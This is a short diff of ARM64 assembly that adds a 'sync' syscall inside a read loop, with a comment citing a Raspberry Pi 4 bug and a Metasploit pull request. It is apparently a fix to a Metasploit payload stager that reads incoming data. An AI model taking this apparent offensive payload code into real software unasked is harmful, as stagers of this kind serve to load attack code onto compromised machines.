@@ -77,6 +77,10 @@ read_loop:
     svc    0
     cmn    x0, #0x1
     beq    failed
+    mov    x2, x0       // The 'sync' syscall was added to fix a strange bug in RaspberryPi 4
+    mov    x8, #0x51    // More information here: 
+    svc    0            //    https://github.com/rapid7/metasploit-framework/pull/19875
+    mov    x0, x2       //
     add    x3, x3, x0
     subs   x4, x4, x0
     bne    read_loop
